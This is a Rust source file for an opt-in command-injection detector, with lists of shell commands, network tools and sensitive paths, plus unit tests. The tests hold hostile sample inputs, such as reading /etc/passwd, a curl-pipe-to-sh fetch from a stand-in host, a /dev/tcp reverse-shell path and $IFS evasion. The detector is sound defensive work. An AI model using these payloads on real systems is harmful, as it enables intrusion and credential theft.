//! Command injection (CMDi) lexical detector (W17-R-01).
//!
//! Heuristics for Unix shells (sh, bash) and Windows (cmd.exe, PowerShell):
//! command separators followed by a command, command substitution, shell
//! interpreter invocations, sensitive paths and reverse-shell redirections.
//! Every scan is linear in the input; there is no recursion and no
//! allocation. This is not a shell parser: it backs the opt-in `detect_cmdi`
//! rule operator and no rule enables it by default.
#![forbid(unsafe_code)]

/// Program names that are not ordinary words: after a separator they are a
/// command whatever follows.
const STRONG_COMMANDS: &[&[u8]] = &[
    b"whoami",
    b"uname",
    b"id",
    b"pwd",
    b"hostname",
    b"ls",
    b"curl",
    b"wget",
    b"nc",
    b"netcat",
    b"ncat",
    b"socat",
    b"traceroute",
    b"bash",
    b"sh",
    b"zsh",
    b"ksh",
    b"csh",
    b"python3",
    b"chmod",
    b"chown",
    b"killall",
    b"rm",
    b"cp",
    b"mv",
    b"mkdir",
    b"grep",
    b"awk",
    b"printf",
    b"printenv",
    b"ifconfig",
    b"netstat",
    b"iptables",
    b"sudo",
    b"passwd",
    b"gzip",
    b"gunzip",
    b"cmd",
    b"cmd.exe",
    b"powershell",
    b"powershell.exe",
    b"pwsh",
    b"dir",
    b"ipconfig",
    b"certutil",
    b"bitsadmin",
    b"calc.exe",
    b"wmic",
    b"tasklist",
    b"taskkill",
];

/// Commands that are also ordinary words ("find", "more", "type"...): they
/// count only with an argument that looks like shell (see `shell_argument`).
const WORD_COMMANDS: &[&[u8]] = &[
    b"cat", b"ping", b"dash", b"python", b"perl", b"ruby", b"php", b"node", b"kill", b"touch",
    b"find", b"sed", b"head", b"tail", b"more", b"less", b"echo", b"env", b"export", b"set", b"ps",
    b"top", b"ip", b"route", b"su", b"shadow", b"dd", b"tar", b"zip", b"unzip", b"sleep", b"type",
    b"net", b"calc", b"reg",
];

/// Sensitive paths that indicate Unix command execution in shell context.
const SENSITIVE_PATHS: &[&[u8]] = &[
    b"/etc/passwd",
    b"/etc/shadow",
    b"/etc/hosts",
    b"/etc/group",
    b"/dev/null",
    b"/dev/tcp",
    b"/dev/udp",
    b"/bin/sh",
    b"/bin/bash",
    b"/usr/bin/sh",
    b"/usr/bin/bash",
    b"/bin/cat",
    b"/bin/ls",
    b"/bin/nc",
    b"/usr/bin/id",
    b"/usr/bin/whoami",
];

const SHELL_PATHS: &[&[u8]] = &[b"/bin/sh", b"/bin/bash", b"/usr/bin/sh", b"/usr/bin/bash"];

/// Longest command name compared; longer tokens cannot be a known command.
const TOKEN_MAX: usize = 64;

#[derive(Clone, Copy, PartialEq)]
enum Kind {
    Strong,
    Word,
}

/// Separator or chaining operator: `;`, `|`, `&`, backtick and line breaks.
#[inline]
fn is_shell_separator(b: u8) -> bool {
    matches!(b, b';' | b'|' | b'&' | b'`' | b'\n' | b'\r')
}

/// Detects command injection in arbitrary bytes.
pub fn detect(input: &[u8]) -> bool {
    if input.is_empty() {
        return false;
    }

    // Shell IFS evasion: $IFS or ${IFS} (the second contains no "$IFS").
    if contains(input, b"$IFS") || contains(input, b"${IFS}") {
        return true;
    }

    // Every sensitive path begins with '/': check candidate positions once,
    // with a boundary on both sides.
    for (pos, &c) in input.iter().enumerate() {
        if c != b'/' || (pos != 0 && !path_boundary(input[pos - 1])) {
            continue;
        }
        if starts_with_path(&input[pos..], SENSITIVE_PATHS) {
            return true;
        }
    }

    // A whole value that is a command with a shell argument:
    // "cat /etc/x", "curl -O ...", "sleep 5".
    let start = skip_shell_whitespace(input, 0);
    if command_with_argument(&input[start..], false) {
        return true;
    }

    // Command substitution: `...` and $(...). The two closer iterators only
    // move forward; every opener is inspected without recursion so a nested
    // $(...) cannot hide its inner command.
    let mut ticks = input
        .iter()
        .enumerate()
        .filter_map(|(i, &c)| (c == b'`').then_some(i))
        .peekable();
    let mut parens = input
        .iter()
        .enumerate()
        .filter_map(|(i, &c)| (c == b')').then_some(i))
        .peekable();
    for i in 0..input.len() {
        let (from, end) = if input[i] == b'`' {
            let from = i + 1;
            while ticks.peek().is_some_and(|&p| p < from) {
                ticks.next();
            }
            (from, ticks.peek().copied())
        } else if input[i..].starts_with(b"$(") {
            let from = i + 2;
            while parens.peek().is_some_and(|&p| p < from) {
                parens.next();
            }
            (from, parens.peek().copied())
        } else {
            continue;
        };
        if let Some(end) = end {
            let inner = &input[from..end];
            let inner = &inner[skip_shell_whitespace(inner, 0)..];
            if command_kind(inner).is_some()
                || starts_with_shell_interpreter(inner)
                || starts_with_path(inner, SENSITIVE_PATHS)
            {
                return true;
            }
        }
    }

    // A separator followed by a command: "; id", "| whoami", "&& cat /x".
    let len = input.len();
    let mut idx = 0;
    while idx < len {
        if !is_shell_separator(input[idx]) {
            idx += 1;
            continue;
        }
        let mut next = idx + 1;
        while next < len && is_shell_separator(input[next]) {
            next += 1;
        }
        next = skip_shell_whitespace(input, next);
        if next < len && command_with_argument(&input[next..], true) {
            return true;
        }
        idx = next;
    }

    // Interpreter invocation: "cmd.exe /c ...", "powershell -enc ...",
    // "/bin/sh -c ...".
    if starts_with_shell_interpreter(input) {
        return true;
    }

    // Reverse shells and descriptor duplication.
    contains(input, b"2>&1") || contains(input, b"/dev/tcp/") || contains(input, b"/dev/udp/")
}

fn contains(input: &[u8], needle: &[u8]) -> bool {
    input.windows(needle.len()).any(|w| w == needle)
}

/// `s` starts with a command. A strong command after a separator
/// (`after_separator`) matches on its own; otherwise the command needs
/// whitespace and then a shell argument.
fn command_with_argument(s: &[u8], after_separator: bool) -> bool {
    let mut buf = [0u8; TOKEN_MAX];
    let (token, raw_len) = extract_first_token(s, &mut buf);
    let Some(kind) = lookup(token) else {
        return false;
    };
    if after_separator && kind == Kind::Strong {
        return true;
    }
    let rest = skip_shell_whitespace(s, raw_len);
    // "net/http", "id/5": a word glued to a path is not a command line.
    if rest == raw_len || rest >= s.len() {
        return false;
    }
    shell_argument(token, &s[rest..], kind)
}

/// Argument of a command line: an option (`-x`), an absolute or Windows path,
/// a URL, a substitution, or (strong commands only) a redirection. "sleep"
/// and "ping" also take a number.
fn shell_argument(token: &[u8], arg: &[u8], kind: Kind) -> bool {
    let first = arg[0];
    let second = arg.get(1).copied().unwrap_or(0);
    (first == b'-' && (second.is_ascii_alphanumeric() || second == b'-'))
        || (first == b'/'
            && (second.is_ascii_alphanumeric()
                || second.is_ascii_whitespace()
                || matches!(second, 0 | b'.' | b'?' | b'*')))
        || first == b'\\'
        || arg.starts_with(b"http://")
        || arg.starts_with(b"https://")
        || arg.starts_with(b"$(")
        || first == b'`'
        || (kind == Kind::Strong && matches!(first, b'<' | b'>'))
        || (matches!(token, b"sleep" | b"ping") && first.is_ascii_digit())
}

fn lookup(token: &[u8]) -> Option<Kind> {
    if token.is_empty() {
        None
    } else if STRONG_COMMANDS.contains(&token) {
        Some(Kind::Strong)
    } else if WORD_COMMANDS.contains(&token) {
        Some(Kind::Word)
    } else {
        None
    }
}

fn command_kind(s: &[u8]) -> Option<Kind> {
    let mut buf = [0u8; TOKEN_MAX];
    lookup(extract_first_token(s, &mut buf).0)
}

/// Skips ASCII whitespace, '+' (form encoding of a space) and `$IFS`/`${IFS}`.
fn skip_shell_whitespace(input: &[u8], mut idx: usize) -> usize {
    let len = input.len();
    while idx < len {
        if input[idx].is_ascii_whitespace() || input[idx] == b'+' {
            idx += 1;
        } else if input[idx..].starts_with(b"${IFS}") {
            idx += 6;
        } else if input[idx..].starts_with(b"$IFS") {
            idx += 4;
        } else {
            break;
        }
    }
    idx
}

/// Reads one command token into fixed stack storage, lowercased, without
/// quote/escape obfuscation (c'a't, c\at). Returns the token and the number
/// of input bytes it spans; a token longer than the storage is empty.
fn extract_first_token<'a>(s: &[u8], buf: &'a mut [u8; TOKEN_MAX]) -> (&'a [u8], usize) {
    let mut used = 0;
    let mut end = 0;
    for &c in s {
        if c.is_ascii_whitespace()
            || is_shell_separator(c)
            || matches!(c, b'/' | b'<' | b'>' | b'+' | b'$')
        {
            break;
        }
        end += 1;
        if matches!(c, b'\'' | b'"' | b'\\') {
            continue;
        }
        if used == buf.len() {
            return (&[], end);
        }
        buf[used] = c.to_ascii_lowercase();
        used += 1;
    }
    (&buf[..used], end)
}

/// Interpreter invocation such as "powershell -c ...", "cmd.exe /c ..." or
/// "/bin/sh -c ...".
fn starts_with_shell_interpreter(s: &[u8]) -> bool {
    let start = s
        .iter()
        .position(|c| !c.is_ascii_whitespace())
        .unwrap_or(s.len());
    let trimmed = &s[start..];
    let mut buf = [0u8; TOKEN_MAX];
    let (token, raw_len) = extract_first_token(trimmed, &mut buf);
    if matches!(
        token,
        b"powershell" | b"powershell.exe" | b"cmd" | b"cmd.exe" | b"pwsh"
    ) {
        let rem = skip_shell_whitespace(trimmed, raw_len);
        if rem > raw_len && matches!(trimmed.get(rem), Some(b'-' | b'/')) {
            return true;
        }
    }
    starts_with_path(trimmed, SHELL_PATHS)
}

fn starts_with_path(s: &[u8], paths: &[&[u8]]) -> bool {
    paths
        .iter()
        .any(|path| s.starts_with(path) && path_end(&s[path.len()..], path))
}

fn path_boundary(c: u8) -> bool {
    c.is_ascii_whitespace() || is_shell_separator(c) || matches!(c, b'<' | b'>' | b'\'' | b'"')
}

fn path_end(rest: &[u8], path: &[u8]) -> bool {
    rest.first().is_none_or(|&c| {
        path_boundary(c) || c == b')' || (c == b'/' && matches!(path, b"/dev/tcp" | b"/dev/udp"))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn attacks_are_detected() {
        for attack in [
            &b"; cat /etc/passwd"[..],
            b";cat /etc/passwd",
            b"| whoami",
            b"|| whoami",
            b"&& id",
            b"& dir",
            b"127.0.0.1; ping 192.0.2.8",
            b"127.0.0.1\nping -c 3 192.0.2.8",
            b"test;cat+/etc/passwd",
            b"test|whoami",
            b"`id`",
            b"`whoami`",
            b"$(uname -a)",
            b"$(cat /etc/shadow)",
            b";curl http://payload.example.test/shell.sh|sh",
            b"curl -O http://payload.example.test/malware && chmod +x malware",
            b"cat$IFS/etc/passwd",
            b"cat${IFS}/etc/passwd",
            b"c'a't /etc/passwd",
            b"c\"a\"t /etc/passwd",
            b"cmd.exe /c dir",
            b"powershell.exe -enc AAAA",
            b"/bin/sh -c 'whoami'",
            b"foo; sleep 10",
            b"2>&1",
            b"/dev/tcp/10.0.0.1/4444",
            b"x; find / -name id_rsa",
            b"x\nhead -n 5 secrets.txt",
            b"x; echo $(id)",
            b"x | type \\windows\\win.ini",
            b"; ls > out.txt",
        ] {
            assert!(detect(attack), "missed: {}", attack.escape_ascii());
        }
    }

    #[test]
    fn benign_inputs_are_not_detected() {
        for benign in [
            &b"hello world"[..],
            b"category=books&sort=price",
            b"1 + 2 = 3; 4 + 5 = 9",
            b"Hello; nice to meet you",
            b"width: 100px; height: 50px;",
            b"category",
            b"concatenation",
            b"locate",
            b"indicator",
            b"user@example.com",
            b"https://api.example.test/api?id=1234&user=alice",
            b"",
        ] {
            assert!(!detect(benign), "flagged: {}", benign.escape_ascii());
        }
    }

    // Commands glued to a path segment and commands that are English words
    // in prose used to be flagged.
    #[test]
    fn paths_and_prose_are_not_commands() {
        for benign in [
            &b"net/http"[..],
            b"id/5",
            b"ip/24",
            b"top/rated",
            b"type/json",
            b"Thanks for the help\nfind me at the front desk",
            b"Hello; more details later",
            b"Lorem ipsum dolor sit amet.\nSed ut perspiciatis unde omnis",
            b"Done; set the meeting for Monday",
            b"see you\ntouch base tomorrow",
            b"We did it; less is more",
            b"top - rated items",
            b"sleep well",
            b"Results:\nhead office in Hanoi",
            b"a < b; top > bottom",
        ] {
            assert!(!detect(benign), "flagged: {}", benign.escape_ascii());
        }
    }
}

#[cfg(test)]
mod regression {
    use super::*;

    #[test]
    fn escaped_and_nested_commands_are_detected() {
        for input in [
            b"; c\\at /etc/hosts".as_slice(),
            b"; whoam\\i",
            b"$( $(id) )",
            b"$( `$(id)` )",
        ] {
            assert!(detect(input), "{}", input.escape_ascii());
        }
        let mut nested = b"$( ".repeat(16384);
        nested.extend_from_slice(b"id)");
        assert!(detect(&nested));
    }

    #[test]
    fn path_prefixes_are_not_sensitive_paths() {
        for input in [
            b"/bin/shopping".as_slice(),
            b"/bin/bashful",
            b"/etc/passwd-backup",
            b"/dev/nullify",
        ] {
            assert!(!detect(input), "{}", input.escape_ascii());
        }
        assert!(detect(b"/etc/passwd-backup /etc/passwd"));
    }

    #[test]
    fn long_tokens_are_not_commands() {
        let mut long = b"; ".to_vec();
        long.extend_from_slice(&b"a".repeat(TOKEN_MAX));
        long.extend_from_slice(b"id");
        assert!(!detect(&long));
        let mut quotes = b"; ".to_vec();
        quotes.extend_from_slice(&b"'".repeat(4096));
        quotes.extend_from_slice(b"id");
        assert!(detect(&quotes));
    }

    #[test]
    fn repeated_unmatched_and_empty_syntax_stays_bounded() {
        for input in [
            b"$(".repeat(32768),
            b";".repeat(65536),
            b"$(  ".repeat(16384),
            b"` ` ".repeat(16384),
            b"; '".repeat(16384),
            b"\n+".repeat(32768),
        ] {
            let start = std::time::Instant::now();
            assert!(!detect(&input));
            // Linear scans take well under a millisecond here; a quadratic
            // one over 64 KiB takes seconds even in debug builds.
            assert!(start.elapsed().as_millis() < 500, "{:?}", start.elapsed());
        }
    }
}
